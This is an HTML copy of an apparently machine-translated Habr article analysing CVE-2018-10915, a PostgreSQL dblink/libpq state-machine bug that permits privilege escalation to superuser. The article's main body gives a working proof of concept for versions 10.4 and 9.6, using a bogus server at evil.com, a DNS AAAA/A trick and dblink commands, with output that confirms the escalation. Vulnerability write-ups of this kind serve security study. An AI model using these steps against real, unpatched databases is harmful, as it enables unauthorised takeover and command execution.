<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Privilege escalation in PostgreSQL - parsing CVE-2018-10915</title>
  <meta name="description" content="It is no secret that the state machines are among us. They are literally everywhere, from the UI to the network stack. Sometimes complex, sometimes si...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({
      google_ad_client: "ca-pub-6974184241884155",
      enable_page_level_ads: true
    });
  </script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="https://quick-geek.github.io/search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <section class="page js-page"><h1>Privilege escalation in PostgreSQL - parsing CVE-2018-10915</h1><div class="post__text post__text-html js-mediator-article"><img alt="KDPV" src="https://habrastorage.org/webt/jx/p4/br/jxp4br2he9tokl9esruwbnx7j78.png"><br><p>  It is no secret that the state machines are among us.  They are literally everywhere, from the UI to the network stack.  Sometimes complex, sometimes simple.  Sometimes security-related, sometimes not so.  But, often, quite exciting to learn :) Today I want to talk about one fun case with PostgreSQL - <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-10915">CVE-2018-10915</a> , which allowed you to upgrade privileges to superuser. </p><a name="habracut"></a><br><h2 id="nebolshoe-intro">  Small intro </h2><br><p>  As you know, managed databases step through the world.  It is not surprising - if you have a simple, non-demanding application, then why curl with cooking your own base.  After all, the majority of cloud (or specialized) providers can click on MySQL / PostgreSQL / MongoDB / etc base and live happily ever after.  Of course, this caused additional problems, because  If earlier for the operation of most of the security problems in the databases you had to first raskachit attachment (which in itself is game over in most cases), now they <del>  bare ass </del>  their interface stand to the attacker.  There should be a remark about the fact that the next barrier should be a high-quality infrastructure and this is true, but today is not about that. </p><br><h2 id="sut-cve-2018-10915">  Essence CVE-2018-10915 </h2><br><ul><li>  in most cases, PostgreSQL does not require authentication for local connections.  An example from the official docker image: </li></ul><br><pre><code class="plaintext hljs"># pg_hba.conf from PostgreSQL docker image # note: debian pkg marked only "local" connections as trusted # "local" is for Unix domain socket connections only local all all trust # IPv4 local connections: host all all 127.0.0.1/32 trust # IPv6 local connections: host all all ::1/128 trust</code> </pre> <br><ul><li>  Thanks to <a href="https://www.postgresql.org/docs/10/static/dblink.html">dblink</a> and <a href="https://www.postgresql.org/docs/10/static/postgres-fdw.html">postgres_fdw</a> extensions, you can connect to remote databases.  And judging by the forums, consumers rarely ask for their availability;) </li><li>  the authors have already been burned by privilege escalation, so they made a hack with the prohibition of connecting without authentication: </li></ul><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// https://github.com/postgres/postgres/blob/0993b8ada53395a8c8a59401a7b4cfb501f6aaef/contrib/dblink/dblink.c#L2621-L2639 static void dblink_security_check(PGconn *conn, remoteConn *rconn) { if (!superuser()) { if (!PQconnectionUsedPassword(conn)) { PQfinish(conn); if (rconn) pfree(rconn); ereport(ERROR, (errcode(ERRCODE_S_R_E_PROHIBITED_SQL_STATEMENT_ATTEMPTED), errmsg("password is required"), errdetail("Non-superuser cannot connect if the server does not request a password."), errhint("Target server's authentication method must be changed."))); } } } // https://github.com/postgres/postgres/blob/0993b8ada53395a8c8a59401a7b4cfb501f6aaef/src/interfaces/libpq/fe-connect.c#L6305-L6314 int PQconnectionUsedPassword(const PGconn *conn) { if (!conn) return false; if (conn-&gt;password_needed) return true; else return false; }</span></span></code> </pre> <br><ul><li>  The <code>password_needed</code> flag is set by the state machine after an <code>AUTH_REQ_MD5</code> or <code>AUTH_REQ_PASSWORD</code> message is received from the server <code>AUTH_REQ_PASSWORD</code> </li><li>  <code>libpq</code> can bypass multiple IPs (pg 9.x) or hosts (pg 10.x / 11.x) in search of a suitable </li><li>  The state machine goes to the following IP / host after setting the <code>password_needed</code> flag in two convenient cases for us: <br><ul><li>  we want a writable session ( <code>target_session_attrs=read-write</code> ), and the server is read-only </li><li>  when receiving an <code>unknown application_name</code> error </li></ul></li><li>  when moving to the next IP / host, <a href="">pqDropConnection</a> is <a href="">called</a> , which cleans the connection data very selectively (as some of them may be needed for reconnect).  Hint: <code>password_needed</code> not reset </li><li>  This allows the dblink_security_check check to be <code>dblink_security_check</code> , since  when connected to the next host, the flag remains with the previous value </li><li>  PROFIT </li></ul><br><p>  Thus, if we have <em>any</em> user with access to <code>dblink</code> and PostgreSQL with trusted connections for this host, we can forget the password authentication requirement, connect on behalf of the <code>postgres</code> superuser, and execute anything on his behalf (for example, arbitrary commands using <code>COPY foo FROM PROGRAM 'whoami';</code> ). </p><br><h2 id="ot-teorii-k-praktike---postgresql-104">  From theory to practice - PostgreSQL 10.4! </h2><br><p>  But theory alone cannot be full, therefore I have prepared a small example of exploiting this vulnerability.  We'll start with PostgreSQL 10.4. </p><br><ul><li>  for a start, we will write and run a simple PostgreSQL server ( <a href="https://github.com/buglloc/bogus-pgsrv">bogus-pgsrv</a> ), which will require password authentication for any request and after receiving it send the <code>ERRCODE_APPNAME_UNKNOWN</code> error: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=evil.com user=test password=test application_name=bar" psql: ERROR: unknown app name could not connect to server: Connection refused Is the server running on host "evil.com" (1.1.1.1) and accepting TCP/IP connections on port 5432?</code> </pre> <br><ul><li>  Now let's prepare a test PostgreSQL: </li></ul><br><pre> <code class="plaintext hljs">$ docker run -it -d -p 5432:5432 -e POSTGRES_PASSWORD=somepass postgres:10.4 e5f07b396d51059c3abf53c8f4f78b0b90a9966289e6df03eb4eccaeeb364545 $ psql "host=localhost user=postgres password=somepass" &lt;&lt;'SQL' CREATE USER test WITH PASSWORD 'test'; CREATE DATABASE test; \c test CREATE EXTENSION dblink; SQL</code> </pre> <br><ul><li>  check that the <code>test</code> user has no specific rights: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=localhost user=test password=test" &lt;&lt;'SQL' \du SQL List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} test</code> </pre> <br><ul><li>  great, now exploit: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=localhost user=test password=test" &lt;&lt;'SQL' select * from dblink_connect('host=evil.com,localhost user=postgres password=foo application_name=bar'); select dblink_exec('ALTER USER test WITH SUPERUSER;'); \du SQL dblink_connect ---------------- OK (1 row) dblink_exec ------------- ALTER ROLE (1 row) List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} test | Superuser</code> </pre> <br><ul><li>  everything.  We can do what you like ^ _ ^ </li></ul><br><h2 id="ot-teorii-k-praktike---postgresql-96">  From theory to practice - PostgreSQL 9.6! </h2><br><p>  With PostgreSQL 9.x, everything is a bit more complicated.  it does not support listing hosts to connect.  But if the address is resolved in several IPs, it will bypass them all!  And since  for IPv6 priority addresses (see <a href="https://tools.ietf.org/html/rfc6724">RFC6724</a> ), we can do the same thing just by answering our IP with an AAAA request, and 127.0.0.1 for A + dropping connections for a few seconds after sending <code>ERRCODE_APPNAME_UNKNOWN</code> : </p><br><ul><li>  Prepare DNS: </li></ul><br><pre> <code class="plaintext hljs">$ host 2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com 2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com has address 127.0.0.1 2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com has IPv6 address 2a01:7e01::f03c:91ff:fe3b:c9ba</code> </pre> <br><ul><li>  we start the same bogus pgsql </li><li>  and again we are preparing a test PostgreSQL (for the docker, IPv6 should work, this is important): </li></ul><br><pre> <code class="plaintext hljs">$ docker run -it -d -p 5432:5432 -e POSTGRES_PASSWORD=somepass postgres:9.6 dfda35ab80ae9dbd69322d00452b7d829f90874b7c70f03bd4e05afec97d296c $ psql "host=localhost user=postgres password=somepass" &lt;&lt;'SQL' CREATE USER test WITH PASSWORD 'test'; CREATE DATABASE test; \c test CREATE EXTENSION dblink; SQL</code> </pre> <br><ul><li>  exploit: </li></ul><br><pre> <code class="plaintext hljs">$ psql "host=localhost user=test password=test" &lt;&lt;'SQL' select * from dblink_connect('host=2a017e0100000000f03c91fffe3bc9ba.6.127-0-0-1.4.m.evil.com user=postgres password=foo application_name=bar'); select dblink_exec('ALTER USER test WITH SUPERUSER;'); \du SQL dblink_connect ---------------- OK (1 row) dblink_exec ------------- ALTER ROLE (1 row) List of roles Role name | Attributes | Member of -----------+------------------------------------------------------------+----------- postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} test | Superuser | {}</code> </pre><br><ul><li>  everything.  We can do what you like ^ _ ^ </li></ul><br><h2 id="zaklyuchenie">  Conclusion </h2><br><p>  In conclusion, I wanted to write something clever, but, unfortunately, I do not have a good, simple and universal way to check that everything is fine with your state machine.  There are various attempts, but from what I have seen, they are either too narrowly specialized, or they still cope with logical errors.  It remains to hope for vigilance and an extra pair of eyes on the review: ( </p></div><p>Source: <a href="https://habr.com/ru/post/440394/">https://habr.com/ru/post/440394/</a></p>
<section class="navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container">Waiting for the list from <a href="../../index.html">here</a>...</nav>
</section>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52319614 = new Ya.Metrika({
                  id:52319614,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52319614" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>
</body>

</html>